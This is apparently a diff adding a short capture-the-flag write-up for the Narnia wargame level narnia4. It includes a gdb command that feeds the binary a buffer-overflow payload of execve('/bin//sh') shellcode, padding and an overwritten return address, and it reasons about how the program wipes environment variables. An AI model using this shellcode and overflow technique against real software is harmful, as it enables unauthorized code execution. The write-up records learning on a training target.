@@ -1,0 +1,9 @@
+Solution and Method
+
+To start I went and immedietly tried the same set of steps applied in narnia2 with the following command:
+gdb --args ./narnia4 $(python -c 'print "AAAA" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 232 + "\x94\xd7\xff\xff"')
+
+With this I was able to launch bin in a minuet, but still didn't have permissions in order to read the contents of narnia5's password. So I began to dive into the details around eviron. So what's currently happening is the program is removing all of the enviormental variables with null characters before we have the oprotunity to use them in our exploit. 
+
+Looking at the for loop where the program checks if the value is NULL, we can stop it early if it hit a Null value in one of eviron's first few indexes. This would allow us to launch the exploit above without difficulty. 
+
